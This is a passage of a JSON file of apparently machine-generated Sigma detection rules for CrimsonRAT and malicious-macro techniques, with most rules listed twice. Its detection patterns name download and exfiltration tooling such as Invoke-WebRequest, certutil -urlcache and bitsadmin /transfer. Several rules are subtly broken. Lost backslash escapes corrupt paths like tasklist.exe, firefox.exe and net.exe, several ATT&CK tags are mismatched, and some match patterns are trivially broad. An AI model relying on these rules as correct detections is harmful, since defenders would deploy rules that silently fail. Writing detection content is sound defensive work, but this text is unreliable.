          "id": "2c6bd7c8-5367-435e-a45b-b2f678c6729d"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "T1082 - System Information Discovery",
        "status": "success",
        "rule": {
          "title": "System Information Discovery via CrimsonRAT",
          "description": "Detects system information discovery using CrimsonRAT malware",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection1": {
              "Image|endswith": "\\systeminfo.exe",
              "CommandLine|contains": [
                "/s",
                "/v"
              ]
            },
            "selection2": {
              "Image|endswith": "\tasklist.exe",
              "CommandLine|contains": [
                "/v",
                "/svc"
              ]
            },
            "selection3": {
              "Image|endswith": "\\wmic.exe",
              "CommandLine|contains": [
                "process",
                "get"
              ]
            },
            "condition": "selection1 or selection2 or selection3"
          },
          "falsepositives": [
            "Legitimate system administration tasks",
            "System monitoring tools"
          ],
          "level": "medium",
          "tags": [
            "attack.discovery",
            "attack.t1082",
            "mitre.system_information_discovery"
          ],
          "ttp_id": "unknown",
          "technique_name": "T1082 - System Information Discovery",
          "generation_method": "langchain",
          "id": "ed53ff08-0b14-43c7-8d43-6adbded0b075"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "T1190 - Exploit Public-Facing Application",
        "status": "success",
        "rule": {
          "title": "Exploit Public-Facing Application via Malicious Document",
          "description": "Detects exploitation of public-facing applications via malicious documents with macro code",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection1": {
              "ParentImage|endswith": "\\WINWORD.EXE",
              "Image|endswith": "\\cmd.exe"
            },
            "selection2": {
              "ParentImage|endswith": "\\WINWORD.EXE",
              "Image|endswith": "\\powershell.exe"
            },
            "condition": "selection1 or selection2"
          },
          "falsepositives": [
            "Legitimate Microsoft Office document editing",
            "PowerShell or command prompt usage for administrative tasks"
          ],
          "level": "high",
          "tags": [
            "attack.initial_access",
            "attack.t1190",
            "custom.mitre_exploit_public_facing_application"
          ],
          "ttp_id": "unknown",
          "technique_name": "T1190 - Exploit Public-Facing Application",
          "generation_method": "langchain",
          "id": "1e4b238f-2f6f-41b0-af2c-77bd0809c05a"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "T1566 - Phishing",
        "status": "success",
        "rule": {
          "title": "T1566 - Phishing via Malicious Document with Macro Code",
          "description": "Detects the execution of malicious documents with macro code to phish users and gain initial access to the system",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection1": {
              "ParentImage|endswith": "\\WINWORD.EXE",
              "Image|endswith": "\\cmd.exe"
            },
            "selection2": {
              "ParentImage|endswith": "\\WINWORD.EXE",
              "Image|endswith": "\\powershell.exe"
            },
            "condition": "selection1 or selection2"
          },
          "falsepositives": [
            "Legitimate Microsoft Office document editing",
            "PowerShell or command prompt usage for administrative tasks"
          ],
          "level": "high",
          "tags": [
            "attack.initial_access",
            "attack.t1566",
            "custom.sigma"
          ],
          "ttp_id": "unknown",
          "technique_name": "T1566 - Phishing",
          "generation_method": "langchain",
          "id": "e3c7dd0a-5ce8-4884-b4dc-8e7f139b39a9"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "T1005 - Data from Local System",
        "status": "success",
        "rule": {
          "title": "CrimsonRAT Data Collection",
          "description": "Detects data collection activity by CrimsonRAT malware",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_crimsonrat": {
              "Image|endswith": "\\crimsonrat.exe"
            },
            "selection_screenshot": {
              "Image|endswith": "\\mspaint.exe",
              "CommandLine|contains": [
                "/pt",
                "/p"
              ]
            },
            "selection_file_collection": {
              "Image|endswith": "\\explorer.exe",
              "CommandLine|contains": [
                "/select,"
              ]
            },
            "condition": "selection_crimsonrat or (selection_screenshot and selection_file_collection)"
          },
          "falsepositives": [
            "Legitimate screenshot and file collection activity by administrators or users",
            "Gaming or graphics software using similar command lines"
          ],
          "level": "high",
          "tags": [
            "attack.collection",
            "attack.t1005",
            "custom.crimsonrat",
            "custom.malware"
          ],
          "ttp_id": "unknown",
          "technique_name": "T1005 - Data from Local System",
          "generation_method": "langchain",
          "id": "acc7c816-475b-4618-9257-1342640274df"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "T1218 - Signed Binary Proxy Execution",
        "status": "success",
        "rule": {
          "title": "Detection of Signed Binary Proxy Execution via CrimsonRAT",
          "description": "Detects the use of CrimsonRAT malware to execute a signed binary proxy, disguising itself as the FireFox browser",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_firefox": {
              "Image|endswith": "\firefox.exe"
            },
            "selection_child_process": {
              "ParentImage|endswith": "\firefox.exe",
              "Image|endswith": [
                "\\cmd.exe",
                "\\powershell.exe",
                "\\wscript.exe",
                "\\cscript.exe",
                "\rundll32.exe",
                "\\mshta.exe",
                "\regsvr32.exe",
                "\\certutil.exe",
                "\bitsadmin.exe"
              ]
            },
            "selection_suspicious_args": {
              "ParentImage|endswith": "\firefox.exe",
              "CommandLine|contains": [
                "-url",
                "-request",
                "http",
                "https",
                "\\",
                "//",
                ":\\",
                "powershell",
                "cmd",
                "base64"
              ]
            },
            "condition": "selection_firefox and (selection_child_process or selection_suspicious_args)"
          },
          "falsepositives": [
            "Legitimate use of Firefox browser",
            "Administrative tasks using command line tools"
          ],
          "level": "high",
          "tags": [
            "attack.defense_evasion",
            "attack.t1218",
            "custom.mitre_attack"
          ],
          "ttp_id": "unknown",
          "technique_name": "T1218 - Signed Binary Proxy Execution",
          "generation_method": "langchain",
          "id": "45ef650a-8d0f-4a1a-a1c7-665a92134c82"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "T1620 - Reflective Code Loading",
        "status": "success",
        "rule": {
          "title": "Reflective Code Loading via .Net Dropper",
          "description": "Detects the use of .Net Dropper to load CrimsonRAT malware reflectively, avoiding detection by security software",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection1": {
              "Image|endswith": "\\dotnet.exe",
              "CommandLine|contains": ".Net Dropper"
            },
            "selection2": {
              "Image|endswith": "\\dotnet.exe",
              "CommandLine|contains": "CrimsonRAT"
            },
            "condition": "selection1 or selection2"
          },
          "falsepositives": [
            "Legitimate .Net applications",
            "False positives may occur if .Net Dropper is used for non-malicious purposes"
          ],
          "level": "high",
          "tags": [
            "attack.defense_evasion",
            "attack.t1620",
            "attack.technique"
          ],
          "ttp_id": "unknown",
          "technique_name": "T1620 - Reflective Code Loading",
          "generation_method": "langchain",
          "id": "ca4d1b43-d997-45dc-9e7e-db04cb061589"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "T1105 - Ingress Tool Transfer",
        "status": "success",
        "rule": {
          "title": "Ingress Tool Transfer via .Net Dropper",
          "description": "Detects the transfer of CrimsonRAT malware to a compromised system using the .Net Dropper program",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection1": {
              "Image|endswith": "\\dotnet.exe",
              "CommandLine|contains": [
                "CrimsonRAT",
                ".Net Dropper"
              ]
            },
            "selection2": {
              "ParentImage|endswith": "\\dotnet.exe",
              "Image|endswith": [
                "\\cmd.exe",
                "\\powershell.exe"
              ]
            },
            "condition": "selection1 or selection2"
          },
          "falsepositives": [
            "Legitimate .Net applications",
            "PowerShell scripts used by administrators"
          ],
          "level": "high",
          "tags": [
            "attack.defense_evasion",
            "attack.t1105",
            "custom.CrimsonRAT",
            ".Net Dropper"
          ],
          "ttp_id": "unknown",
          "technique_name": "T1105 - Ingress Tool Transfer",
          "generation_method": "langchain",
          "id": "bab62857-a6d9-4163-b43b-c1ec42ab3fe9"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "T1041 - Exfiltration Over Command and Control Channel",
        "status": "success",
        "rule": {
          "title": "Exfiltration Over Command and Control Channel via CrimsonRAT",
          "description": "Detects potential exfiltration of data over a command and control channel using the CrimsonRAT malware",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_crimsonrat": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": [
                "-enc",
                "-dec"
              ]
            },
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "Invoke-WebRequest",
                "Out-File"
              ]
            },
            "condition": "selection_crimsonrat or selection_powershell"
          },
          "falsepositives": [
            "Legitimate use of cmd.exe or powershell.exe for system administration tasks",
            "False positives may occur if the rule is not properly tuned for the specific environment"
          ],
          "level": "high",
          "tags": [
            "attack.exfiltration",
            "attack.t1041",
            "mitre.attack"
          ],
          "ttp_id": "unknown",
          "technique_name": "T1041 - Exfiltration Over Command and Control Channel",
          "generation_method": "langchain",
          "id": "32b36b71-9d42-4f12-a17b-e3e55e2b24b9"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "T1021 - Remote Services",
        "status": "success",
        "rule": {
          "title": "CrimsonRAT Remote Services Detection",
          "description": "Detects remote connections established by CrimsonRAT malware",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_crimsonrat": {
              "Image|endswith": "\\crimsonrat.exe"
            },
            "selection_remote_connection": {
              "CommandLine|contains": [
                "-connect",
                "-remote"
              ]
            },
            "condition": "selection_crimsonrat or selection_remote_connection"
          },
          "falsepositives": [
            "Legitimate remote administration tools",
            "False positives may occur due to similar command line flags used by other applications"
          ],
          "level": "high",
          "tags": [
            "attack.lateral_movement",
            "attack.t1021",
            "custom.crimsonrat",
            "custom.remote_services"
          ],
          "ttp_id": "unknown",
          "technique_name": "T1021 - Remote Services",
          "generation_method": "langchain",
          "id": "9c04763b-99e4-4bf1-92c5-d139bb7601ba"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "T1497 - Virtualization/Sandbox Evasion",
        "status": "success",
        "rule": {
          "title": "Virtualization/Sandbox Evasion via CrimsonRAT",
          "description": "Detects the use of CrimsonRAT malware to evade virtualization and sandbox detection",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection1": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": [
                "-enc",
                "-dec"
              ]
            },
            "selection2": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "Invoke-WebRequest",
                "-enc"
              ]
            },
            "selection3": {
              "Image|endswith": "\\certutil.exe",
              "CommandLine|contains": [
                "-decode",
                "-encode"
              ]
            },
            "condition": "selection1 or selection2 or selection3"
          },
          "falsepositives": [
            "Legitimate use of cmd.exe or powershell.exe for encoding or decoding files",
            "Use of certutil.exe for legitimate purposes"
          ],
          "level": "high",
          "tags": [
            "attack.defense_evasion",
            "attack.t1497",
            "custom.mitre_att&ck"
          ],
          "ttp_id": "unknown",
          "technique_name": "T1497 - Virtualization/Sandbox Evasion",
          "generation_method": "langchain",
          "id": "b86c1453-fa0a-4f8e-9384-1fa42bd80b0a"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Exfiltration Over C2 Channel",
        "status": "success",
        "rule": {
          "title": "Exfiltration Over C2 Channel",
          "description": "Detected Exfiltration Over C2 Channel activity via NLP pattern matching",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": [
                "/c",
                "start",
                "echo",
                ">",
                ">>"
              ]
            },
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "Invoke-WebRequest",
                "-enc",
                "Out-File",
                "System.Net.WebClient"
              ]
            },
            "selection_certutil": {
              "Image|endswith": "\\certutil.exe",
              "CommandLine|contains": [
                "-decode",
                "-encode",
                "-urlcache"
              ]
            },
            "selection_bitsadmin": {
              "Image|endswith": "\bitsadmin.exe",
              "CommandLine|contains": [
                "/transfer",
                "http"
              ]
            },
            "condition": "selection_cmd or selection_powershell or selection_certutil or selection_bitsadmin"
          },
          "falsepositives": [
            "Legitimate use of command line tools for system administration",
            "False positives may occur due to benign network activity"
          ],
          "level": "high",
          "tags": [
            "attack.exfiltration",
            "attack.t1567",
            "exfiltration.over.c2.channel"
          ],
          "ttp_id": "unknown",
          "technique_name": "Exfiltration Over C2 Channel",
          "generation_method": "langchain",
          "id": "923d6f9f-f718-447f-9b23-c6aa9c3320f1"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Archive Collected Data",
        "status": "success",
        "rule": {
          "title": "Archive Collected Data via Process Creation",
          "description": "Detects Archive Collected Data activity via process creation events",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "Image|endswith": [
                "\\7z.exe",
                "\\zip.exe",
                "\\rar.exe",
                "\\tar.exe"
              ],
              "CommandLine|contains": [
                "a",
                "c",
                "-a",
                "--archive"
              ]
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate archiving operations",
            "Compressing files for backup purposes"
          ],
          "level": "medium",
          "tags": [
            "attack.collection",
            "attack.t1560",
            "custom.sigma",
            "custom.archived"
          ],
          "ttp_id": "unknown",
          "technique_name": "Archive Collected Data",
          "generation_method": "langchain",
          "id": "f69eff42-23b2-4d92-80ab-821f7accdc42"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Account Discovery",
        "status": "success",
        "rule": {
          "title": "Account Discovery via Command Line Tools",
          "description": "Detected Account Discovery activity via NLP pattern matching",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_net_user": {
              "Image|endswith": "\net.exe",
              "CommandLine|contains": [
                "user",
                "group",
                "localgroup",
                "accounts"
              ]
            },
            "selection_dsquery": {
              "Image|endswith": "\\dsquery.exe",
              "CommandLine|contains": [
                "user",
                "group",
                "computer"
              ]
            },
            "selection_wmic": {
              "Image|endswith": "\\wmic.exe",
              "CommandLine|contains": [
                "useraccount",
                "group",
                "netuser"
              ]
            },
            "condition": "selection_net_user or selection_dsquery or selection_wmic"
          },
          "falsepositives": [
            "Administrative tasks",
            "Scripted user management"
          ],
          "level": "medium",
          "tags": [
            "attack.discovery",
            "attack.t1562",
            "custom.sigma"
          ],
          "ttp_id": "unknown",
          "technique_name": "Account Discovery",
          "generation_method": "langchain",
          "id": "477dd14d-e23c-46bd-8714-3a84ce3b92c1"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Screen Capture",
        "status": "success",
        "rule": {
          "title": "Screen Capture via NLP Pattern Matching",
          "description": "Detects Screen Capture activity via NLP pattern matching",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "Image|endswith": [
                "\\mspaint.exe",
                "\\snippingtool.exe"
              ],
              "CommandLine|contains": [
                "/clip",
                "-clip"
              ]
            },
            "selection_parent": {
              "ParentImage|endswith": [
                "\\explorer.exe",
                "\\winword.exe"
              ]
            },
            "condition": "selection and selection_parent"
          },
          "falsepositives": [
            "Legitimate screenshot captures by users",
            "Gaming applications using screen capture functionality"
          ],
          "level": "medium",
          "tags": [
            "attack.collection",
            "attack.t1560",
            "attack.screen_capture"
          ],
          "ttp_id": "unknown",
          "technique_name": "Screen Capture",
          "generation_method": "langchain",
          "id": "e23e7dcc-d28d-4d06-a3f3-6b88134aadfa"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Phishing",
        "status": "success",
        "rule": {
          "title": "Phishing Detection via Office Process Spawning Command Shells",
          "description": "Detects Office processes spawning command shells, a common indicator of phishing attacks",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "ParentImage|endswith": [
                "\\WINWORD.EXE",
                "\\EXCEL.EXE",
                "\\PPT.EXE"
              ],
              "Image|endswith": [
                "\\cmd.exe",
                "\\powershell.exe"
              ]
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate office automation scripts",
            "Administrative tasks using command shells"
          ],
          "level": "medium",
          "tags": [
            "attack.t1566",
            "attack.initial_access"
          ],
          "ttp_id": "unknown",
          "technique_name": "Phishing",
          "generation_method": "langchain",
          "id": "8c88b1e8-0e85-443a-bb91-57a9cbdd862d"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "User Execution: Malicious File",
        "status": "success",
        "rule": {
          "title": "User Execution: Malicious File",
          "description": "Detected User Execution: Malicious File activity via NLP pattern matching",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "Image|endswith": [
                "\\cmd.exe",
                "\\powershell.exe"
              ],
              "ParentImage|endswith": [
                "\\winword.exe",
                "\\excel.exe",
                "\\outlook.exe"
              ]
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate execution of cmd.exe or powershell.exe by administrators or developers",
            "Execution of cmd.exe or powershell.exe for automation purposes"
          ],
          "level": "medium",
          "tags": [
            "attack.execution",
            "attack.t1566",
            "attack.t1204"
          ],
          "ttp_id": "unknown",
          "technique_name": "User Execution: Malicious File",
          "generation_method": "langchain",
          "id": "9ccd2e07-446a-4493-992b-582d57a1f328"
        },
        "generation_method": "langchain"
      }
    ],
    "rules": [
      {
        "title": "T1204 - User Execution via Malicious Document",
        "description": "Detects the execution of malware through a malicious document with macro code",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection1": {
            "ParentImage|endswith": "\\WINWORD.EXE",
            "Image|endswith": "\\cmd.exe"
          },
          "selection2": {
            "ParentImage|endswith": "\\WINWORD.EXE",
            "Image|endswith": "\\powershell.exe"
          },
          "condition": "selection1 or selection2"
        },
        "falsepositives": [
          "Legitimate Microsoft Office documents with macros",
          "Administrative tasks using command shells"
        ],
        "level": "medium",
        "tags": [
          "attack.execution",
          "attack.t1204",
          "custom.mitre_attack"
        ],
        "ttp_id": "unknown",
        "technique_name": "T1204 - User Execution",
        "generation_method": "langchain",
        "id": "23db6176-6ab4-4ed5-951d-420ee3b7e031"
      },
      {
        "title": "T1059 - Command and Scripting Interpreter via .Net Dropper",
        "description": "Detects the use of a .Net Dropper program to execute malware by checking for the existence of a zip file and reading the resource section",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection1": {
            "Image|endswith": "\\cmd.exe",
            "ParentImage|endswith": "\\dotnet.exe"
          },
          "selection2": {
            "Image|endswith": "\\powershell.exe",
            "ParentImage|endswith": "\\dotnet.exe"
          },
          "condition": "selection1 or selection2"
        },
        "falsepositives": [
          "Legitimate .Net applications using cmd.exe or powershell.exe",
          "Administrative tasks using .Net and command line tools"
        ],
        "level": "medium",
        "tags": [
          "attack.execution",
          "attack.t1059",
          "custom.sigma"
        ],
        "ttp_id": "unknown",
        "technique_name": "T1059 - Command and Scripting Interpreter",
        "generation_method": "langchain",
        "id": "2c6bd7c8-5367-435e-a45b-b2f678c6729d"
      },
      {
        "title": "System Information Discovery via CrimsonRAT",
        "description": "Detects system information discovery using CrimsonRAT malware",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection1": {
            "Image|endswith": "\\systeminfo.exe",
            "CommandLine|contains": [
              "/s",
              "/v"
            ]
          },
          "selection2": {
            "Image|endswith": "\tasklist.exe",
            "CommandLine|contains": [
              "/v",
              "/svc"
            ]
          },
          "selection3": {
            "Image|endswith": "\\wmic.exe",
            "CommandLine|contains": [
              "process",
              "get"
            ]
          },
          "condition": "selection1 or selection2 or selection3"
        },
        "falsepositives": [
          "Legitimate system administration tasks",
          "System monitoring tools"
        ],
        "level": "medium",
        "tags": [
          "attack.discovery",
          "attack.t1082",
          "mitre.system_information_discovery"
        ],
        "ttp_id": "unknown",
        "technique_name": "T1082 - System Information Discovery",
        "generation_method": "langchain",
        "id": "ed53ff08-0b14-43c7-8d43-6adbded0b075"
      },
      {
        "title": "Exploit Public-Facing Application via Malicious Document",
        "description": "Detects exploitation of public-facing applications via malicious documents with macro code",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection1": {
            "ParentImage|endswith": "\\WINWORD.EXE",
            "Image|endswith": "\\cmd.exe"
          },
          "selection2": {
            "ParentImage|endswith": "\\WINWORD.EXE",
            "Image|endswith": "\\powershell.exe"
          },
          "condition": "selection1 or selection2"
        },
        "falsepositives": [
          "Legitimate Microsoft Office document editing",
          "PowerShell or command prompt usage for administrative tasks"
        ],
        "level": "high",
        "tags": [
          "attack.initial_access",
          "attack.t1190",
          "custom.mitre_exploit_public_facing_application"
        ],
        "ttp_id": "unknown",
        "technique_name": "T1190 - Exploit Public-Facing Application",
        "generation_method": "langchain",
        "id": "1e4b238f-2f6f-41b0-af2c-77bd0809c05a"
      },
      {
        "title": "T1566 - Phishing via Malicious Document with Macro Code",
        "description": "Detects the execution of malicious documents with macro code to phish users and gain initial access to the system",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection1": {
            "ParentImage|endswith": "\\WINWORD.EXE",
            "Image|endswith": "\\cmd.exe"
          },
          "selection2": {
            "ParentImage|endswith": "\\WINWORD.EXE",
            "Image|endswith": "\\powershell.exe"
          },
          "condition": "selection1 or selection2"
        },
        "falsepositives": [
          "Legitimate Microsoft Office document editing",
          "PowerShell or command prompt usage for administrative tasks"
        ],
        "level": "high",
        "tags": [
          "attack.initial_access",
          "attack.t1566",
          "custom.sigma"
        ],
        "ttp_id": "unknown",
        "technique_name": "T1566 - Phishing",
        "generation_method": "langchain",
        "id": "e3c7dd0a-5ce8-4884-b4dc-8e7f139b39a9"
      },
      {
        "title": "CrimsonRAT Data Collection",
        "description": "Detects data collection activity by CrimsonRAT malware",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_crimsonrat": {
            "Image|endswith": "\\crimsonrat.exe"
          },
          "selection_screenshot": {
            "Image|endswith": "\\mspaint.exe",
            "CommandLine|contains": [
              "/pt",
              "/p"
            ]
          },
          "selection_file_collection": {
            "Image|endswith": "\\explorer.exe",
            "CommandLine|contains": [
              "/select,"
            ]
          },
          "condition": "selection_crimsonrat or (selection_screenshot and selection_file_collection)"
        },
        "falsepositives": [
          "Legitimate screenshot and file collection activity by administrators or users",
          "Gaming or graphics software using similar command lines"
        ],
        "level": "high",
        "tags": [
          "attack.collection",
          "attack.t1005",
          "custom.crimsonrat",
          "custom.malware"
        ],
        "ttp_id": "unknown",
        "technique_name": "T1005 - Data from Local System",
        "generation_method": "langchain",
        "id": "acc7c816-475b-4618-9257-1342640274df"
      },
      {
        "title": "Detection of Signed Binary Proxy Execution via CrimsonRAT",
        "description": "Detects the use of CrimsonRAT malware to execute a signed binary proxy, disguising itself as the FireFox browser",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_firefox": {
            "Image|endswith": "\firefox.exe"
          },
          "selection_child_process": {
            "ParentImage|endswith": "\firefox.exe",
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe",
              "\\wscript.exe",
              "\\cscript.exe",
              "\rundll32.exe",
              "\\mshta.exe",
              "\regsvr32.exe",
              "\\certutil.exe",
              "\bitsadmin.exe"
            ]
          },
          "selection_suspicious_args": {
            "ParentImage|endswith": "\firefox.exe",
            "CommandLine|contains": [
              "-url",
              "-request",
              "http",
              "https",
              "\\",
              "//",
              ":\\",
              "powershell",
              "cmd",
              "base64"
            ]
          },
          "condition": "selection_firefox and (selection_child_process or selection_suspicious_args)"
        },
        "falsepositives": [
          "Legitimate use of Firefox browser",
          "Administrative tasks using command line tools"
        ],
        "level": "high",
        "tags": [
          "attack.defense_evasion",
          "attack.t1218",
          "custom.mitre_attack"
        ],
        "ttp_id": "unknown",
        "technique_name": "T1218 - Signed Binary Proxy Execution",
        "generation_method": "langchain",
        "id": "45ef650a-8d0f-4a1a-a1c7-665a92134c82"
      },
      {
        "title": "Reflective Code Loading via .Net Dropper",
        "description": "Detects the use of .Net Dropper to load CrimsonRAT malware reflectively, avoiding detection by security software",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection1": {
            "Image|endswith": "\\dotnet.exe",
            "CommandLine|contains": ".Net Dropper"
          },
          "selection2": {
            "Image|endswith": "\\dotnet.exe",
            "CommandLine|contains": "CrimsonRAT"
          },
          "condition": "selection1 or selection2"
        },
        "falsepositives": [
          "Legitimate .Net applications",
          "False positives may occur if .Net Dropper is used for non-malicious purposes"
        ],
        "level": "high",
        "tags": [
          "attack.defense_evasion",
          "attack.t1620",
          "attack.technique"
        ],
        "ttp_id": "unknown",
        "technique_name": "T1620 - Reflective Code Loading",
        "generation_method": "langchain",
        "id": "ca4d1b43-d997-45dc-9e7e-db04cb061589"
      },
      {
        "title": "Ingress Tool Transfer via .Net Dropper",
        "description": "Detects the transfer of CrimsonRAT malware to a compromised system using the .Net Dropper program",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection1": {
            "Image|endswith": "\\dotnet.exe",
            "CommandLine|contains": [
              "CrimsonRAT",
              ".Net Dropper"
            ]
          },
          "selection2": {
            "ParentImage|endswith": "\\dotnet.exe",
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe"
            ]
          },
          "condition": "selection1 or selection2"
        },
        "falsepositives": [
          "Legitimate .Net applications",
          "PowerShell scripts used by administrators"
        ],
        "level": "high",
        "tags": [
          "attack.defense_evasion",
          "attack.t1105",
          "custom.CrimsonRAT",
          ".Net Dropper"
        ],
        "ttp_id": "unknown",
        "technique_name": "T1105 - Ingress Tool Transfer",
        "generation_method": "langchain",
        "id": "bab62857-a6d9-4163-b43b-c1ec42ab3fe9"
      },
      {
        "title": "Exfiltration Over Command and Control Channel via CrimsonRAT",
        "description": "Detects potential exfiltration of data over a command and control channel using the CrimsonRAT malware",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_crimsonrat": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              "-enc",
              "-dec"
            ]
          },
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "Invoke-WebRequest",
              "Out-File"
            ]
          },
          "condition": "selection_crimsonrat or selection_powershell"
        },
        "falsepositives": [
          "Legitimate use of cmd.exe or powershell.exe for system administration tasks",
          "False positives may occur if the rule is not properly tuned for the specific environment"
        ],
        "level": "high",
        "tags": [
          "attack.exfiltration",
          "attack.t1041",
          "mitre.attack"
        ],
        "ttp_id": "unknown",
        "technique_name": "T1041 - Exfiltration Over Command and Control Channel",
        "generation_method": "langchain",
        "id": "32b36b71-9d42-4f12-a17b-e3e55e2b24b9"
      },
      {
        "title": "CrimsonRAT Remote Services Detection",
        "description": "Detects remote connections established by CrimsonRAT malware",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_crimsonrat": {
            "Image|endswith": "\\crimsonrat.exe"
          },
          "selection_remote_connection": {
            "CommandLine|contains": [
              "-connect",
              "-remote"
            ]
          },
          "condition": "selection_crimsonrat or selection_remote_connection"
        },
        "falsepositives": [
          "Legitimate remote administration tools",
          "False positives may occur due to similar command line flags used by other applications"
        ],
        "level": "high",
        "tags": [
          "attack.lateral_movement",
          "attack.t1021",
          "custom.crimsonrat",
          "custom.remote_services"
        ],
        "ttp_id": "unknown",
        "technique_name": "T1021 - Remote Services",
        "generation_method": "langchain",
        "id": "9c04763b-99e4-4bf1-92c5-d139bb7601ba"
      },
      {
        "title": "Virtualization/Sandbox Evasion via CrimsonRAT",
        "description": "Detects the use of CrimsonRAT malware to evade virtualization and sandbox detection",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection1": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              "-enc",
              "-dec"
            ]
          },
          "selection2": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "Invoke-WebRequest",
              "-enc"
            ]
          },
          "selection3": {
            "Image|endswith": "\\certutil.exe",
            "CommandLine|contains": [
              "-decode",
              "-encode"
            ]
          },
          "condition": "selection1 or selection2 or selection3"
        },
        "falsepositives": [
          "Legitimate use of cmd.exe or powershell.exe for encoding or decoding files",
          "Use of certutil.exe for legitimate purposes"
        ],
        "level": "high",
        "tags": [
          "attack.defense_evasion",
          "attack.t1497",
          "custom.mitre_att&ck"
        ],
        "ttp_id": "unknown",
        "technique_name": "T1497 - Virtualization/Sandbox Evasion",
        "generation_method": "langchain",
        "id": "b86c1453-fa0a-4f8e-9384-1fa42bd80b0a"
      },
      {
        "title": "Exfiltration Over C2 Channel",
        "description": "Detected Exfiltration Over C2 Channel activity via NLP pattern matching",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              "/c",
              "start",
              "echo",
              ">",
              ">>"
            ]
          },
          "selection_powershell": {
